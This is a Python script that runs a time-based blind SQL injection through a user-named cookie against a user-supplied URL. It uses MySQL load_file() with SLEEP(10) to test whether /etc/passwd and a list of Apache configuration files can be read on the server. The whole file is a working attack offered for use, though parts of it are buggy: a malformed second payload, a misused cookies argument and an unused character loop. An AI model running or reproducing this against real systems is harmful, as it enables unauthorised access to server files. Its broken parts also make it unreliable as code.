import requests
import urllib.parse
from urllib.parse import quote
import string

BaggyA0_url = input("Enter the URL: ")
CookieVar = input("Enter the cookie parameter name: ")
BaggyA0_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"121\", \"Not A(Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Linux\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Priority": "u=0, i", "Connection": "close"}
dictionary = list(string.ascii_letters) + ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')'] + [str(i) for i in range(10)]

file_paths = [ 
"/etc/passwd", 
"/etc/init.d/apache/httpd.conf", 
"/etc/init.d/apache2/httpd.conf", 
"/etc/httpd/httpd.conf", 
"/etc/httpd/conf/httpd.conf", 
"/etc/apache/apache.conf", 
"/etc/apache/httpd.conf", 
"/etc/apache2/apache2.conf", 
"/etc/apache2/httpd.conf", 
"/usr/local/apache2/conf/httpd.conf", 
"/usr/local/apache/conf/httpd.conf", 
"/opt/apache/conf/httpd.conf", 
"/home/apache/httpd.conf", 
"/home/apache/conf/httpd.conf", 
"/etc/apache2/sites-available/default", 
"/etc/apache2/vhosts.d/default_vhost.include"]

def hexthing(s):
    return '0x' + ''.join(format(ord(c), 'x') for c in s)

hexpaths = [hexthing(s) for s in file_paths]

for hexpath in hexpaths:
    #print(hexpath)
    firstvar = 'TEST" AND (SELECT CASE WHEN (load_file({}) IS NOT NULL THEN SLEEP(10) ELSE "a" END AND "Bagh"="Bagh'.format(hexpath)
    encoded_var = firstvar.replace(" ", "%20")
    BaggyA0_cookies = (f"{CookieVar}: {encoded_var}")
    response = requests.get(BaggyA0_url, headers=BaggyA0_headers, cookies=BaggyA0_cookies)
    
    print("Time taken for iteration", hexpath, ":", response.elapsed.total_seconds(), "seconds")
    if response.elapsed.total_seconds() > 10:
        print("File found:", file_paths[hexpaths.index(hexpath)])
        


    for i in range(0, len(dictionary)):
        find = quote(dictionary[i])
        for hexpath in hexpaths:
            firstvar = '"TEST" AND (SELECT CASE WHEN ((!isnull(load_file({})) THEN SLEEP(10) ELSE "a" AND "bGVm"="bGVm'.format(hexpath)
            encoded_var = firstvar.replace(" ", "%20")
            BaggyA0_cookies = (f"{CookieVar}: {encoded_var}")
            print(BaggyA0_cookies)
            response = requests.get(BaggyA0_url, headers=BaggyA0_headers, cookies=BaggyA0_cookies)
            print("Time taken for iteration", hexpath, ":", response.elapsed.total_seconds(), "seconds")
            if response.elapsed.total_seconds() > 10:
                print("File found:", file_paths[hexpaths.index(hexpath)])
        encoded_var = firstvar.replace(" ", "%20")
        BaggyA0_cookies = (f"{CookieVar}: {encoded_var}")
        print(BaggyA0_cookies)
        response = requests.get(BaggyA0_url, headers=BaggyA0_headers, cookies=BaggyA0_cookies)
        print("Time taken for iteration", find, ":", response.elapsed.total_seconds(), "seconds")

